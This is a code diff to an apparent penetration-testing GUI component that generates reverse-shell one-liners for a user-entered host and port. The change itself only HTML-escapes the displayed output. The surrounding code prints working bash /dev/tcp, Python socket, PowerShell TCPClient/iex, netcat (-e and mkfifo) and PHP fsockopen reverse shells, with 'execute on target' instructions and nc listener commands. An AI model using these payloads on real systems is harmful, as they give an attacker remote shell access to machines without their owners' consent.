@@ -64,15 +64,16 @@ class ReverseShellsComponent(QWidget):
         if not lhost:
             self.shell_output.setHtml("<p style='color: #FF4500;'>[ERROR] Please enter LHOST</p>")
             return
+        from app.core.html_utils import h
         bash_shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
         self.shell_output.setHtml(f"""
         <div style='color: #64C8FF; font-size: 16pt; font-weight: bold;'>Bash Reverse Shell</div>
         <div style='color: #00FF41; font-size: 14pt; font-family: monospace; background: #1a1a1a; padding: 10px; margin: 10px 0;'>
-        {bash_shell}
+        {h(bash_shell)}
         </div>
         <div style='color: #DCDCDC; font-size: 12pt;'>
         <b>Usage:</b> Execute on target system<br>
-        <b>Listener:</b> nc -lvnp {lport}
+        <b>Listener:</b> nc -lvnp {h(lport)}
         </div>
         """)
 
@@ -82,15 +83,16 @@ class ReverseShellsComponent(QWidget):
         if not lhost:
             self.shell_output.setHtml("<p style='color: #FF4500;'>[ERROR] Please enter LHOST</p>")
             return
+        from app.core.html_utils import h
         python_shell = f"""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);"""
         self.shell_output.setHtml(f"""
         <div style='color: #64C8FF; font-size: 16pt; font-weight: bold;'>Python Reverse Shell</div>
         <div style='color: #00FF41; font-size: 12pt; font-family: monospace; background: #1a1a1a; padding: 10px; margin: 10px 0; word-wrap: break-word;'>
-        {python_shell}
+        {h(python_shell)}
         </div>
         <div style='color: #DCDCDC; font-size: 12pt;'>
         <b>Usage:</b> python -c "exec above code"<br>
-        <b>Listener:</b> nc -lvnp {lport}
+        <b>Listener:</b> nc -lvnp {h(lport)}
         </div>
         """)
 
@@ -100,15 +102,16 @@ class ReverseShellsComponent(QWidget):
         if not lhost:
             self.shell_output.setHtml("<p style='color: #FF4500;'>[ERROR] Please enter LHOST</p>")
             return
+        from app.core.html_utils import h
         ps_shell = f"""$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
         self.shell_output.setHtml(f"""
         <div style='color: #64C8FF; font-size: 16pt; font-weight: bold;'>PowerShell Reverse Shell</div>
         <div style='color: #00FF41; font-size: 11pt; font-family: monospace; background: #1a1a1a; padding: 10px; margin: 10px 0; word-wrap: break-word;'>
-        {ps_shell}
+        {h(ps_shell)}
         </div>
         <div style='color: #DCDCDC; font-size: 12pt;'>
         <b>Usage:</b> powershell -c "exec above code"<br>
-        <b>Listener:</b> nc -lvnp {lport}
+        <b>Listener:</b> nc -lvnp {h(lport)}
         </div>
         """)
 
@@ -118,19 +121,20 @@ class ReverseShellsComponent(QWidget):
         if not lhost:
             self.shell_output.setHtml("<p style='color: #FF4500;'>[ERROR] Please enter LHOST</p>")
             return
+        from app.core.html_utils import h
         nc_shell = f"nc -e /bin/sh {lhost} {lport}"
         nc_shell_alt = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
         self.shell_output.setHtml(f"""
         <div style='color: #64C8FF; font-size: 16pt; font-weight: bold;'>Netcat Reverse Shell</div>
         <div style='color: #00FF41; font-size: 14pt; font-family: monospace; background: #1a1a1a; padding: 10px; margin: 10px 0;'>
-        {nc_shell}
+        {h(nc_shell)}
         </div>
         <div style='color: #FFFF00; font-size: 12pt;'>Alternative (if -e not available):</div>
         <div style='color: #00FF41; font-size: 12pt; font-family: monospace; background: #1a1a1a; padding: 10px; margin: 10px 0; word-wrap: break-word;'>
-        {nc_shell_alt}
+        {h(nc_shell_alt)}
         </div>
         <div style='color: #DCDCDC; font-size: 12pt;'>
-        <b>Listener:</b> nc -lvnp {lport}
+        <b>Listener:</b> nc -lvnp {h(lport)}
         </div>
         """)
 
@@ -140,14 +144,15 @@ class ReverseShellsComponent(QWidget):
         if not lhost:
             self.shell_output.setHtml("<p style='color: #FF4500;'>[ERROR] Please enter LHOST</p>")
             return
+        from app.core.html_utils import h
         php_shell = f"""php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'"""
         self.shell_output.setHtml(f"""
         <div style='color: #64C8FF; font-size: 16pt; font-weight: bold;'>PHP Reverse Shell</div>
         <div style='color: #00FF41; font-size: 14pt; font-family: monospace; background: #1a1a1a; padding: 10px; margin: 10px 0; word-wrap: break-word;'>
-        {php_shell}
+        {h(php_shell)}
         </div>
         <div style='color: #DCDCDC; font-size: 12pt;'>
         <b>Usage:</b> Execute on target with PHP installed<br>
-        <b>Listener:</b> nc -lvnp {lport}
+        <b>Listener:</b> nc -lvnp {h(lport)}
         </div>
         """)
